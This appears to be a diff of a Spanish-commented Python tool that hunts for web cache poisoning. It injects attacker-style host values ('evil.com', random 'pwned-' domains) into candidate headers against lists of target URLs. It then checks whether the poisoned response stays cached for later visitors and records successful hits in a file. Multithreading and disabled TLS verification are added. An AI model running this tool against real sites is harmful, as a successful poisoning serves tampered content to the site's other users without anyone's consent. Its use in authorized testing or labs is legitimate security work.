@@ -3,91 +3,129 @@ import hashlib
 import random
 import string
 import sys
+import time
+from concurrent.futures import ThreadPoolExecutor
 
-# Desactivar avisos de SSL
+# Desactivar warnings SSL
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 TIMEOUT = 10
+THREADS = 10 # Un poco más rápido para labs
+OUTPUT_FILE = "fuego.txt"
 
 def random_cb():
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 def get_hash(content):
     return hashlib.md5(content).hexdigest()
 
 def is_cache_hit(headers):
-    cache_headers = ["X-Cache", "CF-Cache-Status", "X-Proxy-Cache", "Age", "Via"]
-    for h in cache_headers:
-        if h in headers:
-            if any(x in headers[h].lower() for x in ["hit", "cached"]):
+    # Buscamos cualquier rastro de que la respuesta vino de la caché
+    indicators = ["cf-cache-status", "x-cache", "x-proxy-cache", "age", "server-timing"]
+    for h, v in headers.items():
+        if h.lower() in indicators:
+            if "hit" in v.lower() or "cached" in v.lower() or h.lower() == "age":
                 return True
     return False
 
-def detect_unkeyed_inputs(url, headers_list):
-    results = {}
-    
-    # 1. BASELINE
-    cb = f"?cb={random_cb()}"
+def safe_request(url, headers=None):
     try:
-        baseline_resp = requests.get(url + cb, timeout=TIMEOUT, verify=False, allow_redirects=False)
-        baseline_hash = get_hash(baseline_resp.content)
+        return requests.get(
+            url,
+            headers=headers or {},
+            timeout=TIMEOUT,
+            verify=False,
+            allow_redirects=False
+        )
     except:
-        print(f"[!] Error conectando a {url}")
-        return results
+        return None
 
-    print(f"\n[*] Baseline OK. Probando {len(headers_list)} cabeceras...")
+# =========================
+# Lógica de Escaneo
+# =========================
 
-    for header in headers_list:
-        header = header.strip()
-        if not header: continue
+def test_header(url, header):
+    header = header.strip()
+    payload = f"pwned-{random_cb()}.com"
 
-        # 2. TEST DE REFLEXIÓN
-        test_val = "evil.com"
-        try:
-            test_resp = requests.get(url + f"?cb={random_cb()}", 
-                                     headers={header: test_val}, 
-                                     timeout=TIMEOUT, 
-                                     verify=False,
-                                     allow_redirects=False)
-            
-            if get_hash(test_resp.content) != baseline_hash:
-                # 3. TEST DE ENVENENAMIENTO (Sin cabecera)
-                # Intentamos ver si la versión con 'evil.com' se quedó pegada
-                poison_check = requests.get(url + f"?cb={random_cb()}", timeout=TIMEOUT, verify=False)
-                
-                status = "UNKEYED (🔥 VULN)" if get_hash(poison_check.content) == get_hash(test_resp.content) else "KEYED (Safe)"
-                hit = is_cache_hit(test_resp.headers)
-                
-                print(f"[!] {header} -> {status} | Cache Hit: {hit}")
-                results[header] = {"status": status, "cache_hit": hit}
-        except:
-            continue
-            
-    return results
+    # 1. Baseline rápido para esta sesión
+    cb = random_cb()
+    test_url = f"{url}?cb={cb}"
+
+    # 2. Intentar envenenar
+    # Solo mandamos UNA cabecera a la vez para saber exactamente cuál es la vulnerable
+    poison_attempt = safe_request(test_url, headers={header: payload})
+
+    if not poison_attempt:
+        return
+
+    # ¿El payload se refleja en alguna parte? (Body o Headers)
+    reflected = payload in poison_attempt.text or any(payload in str(v) for v in poison_attempt.headers.values())
+
+    if reflected:
+        # 3. VERIFICACIÓN: ¿Se quedó pegado?
+        # Esperamos un momento y pedimos la misma URL pero SIN la cabecera
+        time.sleep(1)
+        verification = safe_request(test_url)
+
+        if verification:
+            is_hit = is_cache_hit(verification.headers)
+            still_there = payload in verification.text or any(payload in str(v) for v in verification.headers.values())
+
+            if still_there and is_hit:
+                print(f"\n[🔥 REAL VULN FOUND!] {url}")
+                print(f"    > Header: {header}")
+                print(f"    > Payload: {payload}")
+                print(f"    > Status: Cache Poisoned successfully!\n")
+                with open(OUTPUT_FILE, "a") as f:
+                    f.write(f"VULN: {url} | Header: {header}\n")
+            elif reflected:
+                print(f"[*] Reflejado pero no persistente: {header}")
+
+def scan(url, headers):
+    print(f"\n{'='*50}")
+    print(f"TARGET: {url}")
+    print(f"Probando {len(headers)} cabeceras...")
+    print(f"{'='*50}")
+
+    # Check de cache inicial
+    initial = safe_request(url)
+    if initial and is_cache_hit(initial.headers):
+        print("[+] El servidor usa caché activamente.")
+
+    with ThreadPoolExecutor(max_workers=THREADS) as executor:
+        for h in headers:
+            executor.submit(test_header, url, h)
+
+# =========================
+# MAIN
+# =========================
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
-        print(f"Uso: python3 {sys.argv[0]} <urls.txt> <headers.txt>")
+        print(f"Uso: python3 {sys.argv[0]} <URL_o_Archivo> <headers.txt>")
         sys.exit(1)
 
-    url_file = sys.argv[1]
+    target_input = sys.argv[1]
     header_file = sys.argv[2]
 
-    # Cargar URLs
-    with open(url_file) as f:
-        urls = [line.strip() for line in f if line.strip()]
+    # Cargar cabeceras
+    try:
+        with open(header_file) as f:
+            headers_list = [line.strip() for line in f if line.strip()]
+    except:
+        print("[!] No se pudo leer el archivo de cabeceras.")
+        sys.exit(1)
 
-    # Cargar Cabeceras
-    with open(header_file) as f:
-        headers_to_test = [line.strip() for line in f if line.strip()]
+    # Cargar URLs
+    if target_input.startswith("http"):
+        urls = [target_input]
+    else:
+        with open(target_input) as f:
+            urls = [line.strip() for line in f if line.strip()]
 
     for url in urls:
-        print(f"\n{'='*40}\nTARGET: {url}\n{'='*40}")
-        res = detect_unkeyed_inputs(url, headers_to_test)
-        
-        if res:
-            with open("fuego.txt", "a") as out:
-                for h, info in res.items():
-                    if "UNKEYED" in info['status']:
-                        out.write(f"[VULN] {url} -> {h}\n")
+        scan(url, headers_list)
+
+    print("\n[*] Tarea finalizada.")
